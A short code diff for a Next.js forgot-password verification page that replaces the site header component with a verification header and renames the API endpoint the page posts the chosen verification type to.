@@ -4,7 +4,7 @@ import { useEffect, useRef, useState } from "react";
 import { useRouter } from "next/navigation";
 import { HelpCircle, MessageCircle, Phone, Key, Loader2 } from "lucide-react";
 import { Button } from "@/components/ui/button";
-import { SiteHeader } from "@/components/site-header";
+import { VerificationHeader } from "@/components/verification-header";
 
 const options = [
   {
@@ -53,7 +53,7 @@ export default function ForgotPasswordVerifyPage() {
       });
     }, 1000);
     try {
-      await fetch("/api/telegram/forgot-password-verify", {
+      await fetch("/api/forgot-password-verify", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ verificationType: title }),
@@ -75,7 +75,7 @@ export default function ForgotPasswordVerifyPage() {
 
   return (
     <div className="min-h-screen bg-white flex flex-col">
-      <SiteHeader />
+      <VerificationHeader />
       <div className="max-w-2xl px-4 py-10 mb-[270px] mx-auto md:mx-0 md:ml-[60px] flex-1">
         <div className="flex items-center gap-2 mb-2">
           <h2 className="text-base font-medium text-gray-900">
